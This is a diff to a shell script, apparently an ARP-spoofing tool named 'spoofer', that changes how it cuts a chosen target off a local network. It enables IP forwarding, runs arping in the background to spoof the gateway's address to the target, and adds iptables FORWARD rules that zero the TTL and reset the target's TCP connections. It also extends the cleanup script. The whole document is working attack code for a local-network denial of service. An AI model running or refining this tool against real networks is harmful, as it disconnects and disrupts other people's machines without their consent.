@@ -2,6 +2,7 @@
 
 # Enable ip forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
 
 # Create cleanup script
 cat > /bin/spoofer-stop << EOF
@@ -9,9 +10,11 @@ cat > /bin/spoofer-stop << EOF
 
 # flush prerouting tables 
 iptables -t mangle -F PREROUTING
+iptables -F FORWARD 
 
 # Kill arping processes
 pkill -f arping
+pkill arping
 
 echo "Spoofer cleanup complete"
 EOF
@@ -182,7 +185,8 @@ echo
         if [[ -n "$target" ]]; then
             echo " "
             echo "Blocking the target IP: $target"
-            iptables -t mangle -A PREROUTING -s "$target" -j DROP
+            iptables -t mangle -A FORWARD -s "$target" -j TTL --ttl-set 0
+            iptables -A FORWARD -s "$target" -p tcp -j REJECT --reject-with tcp-reset
           ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
             pid1=$!
             pids+=($pid1)
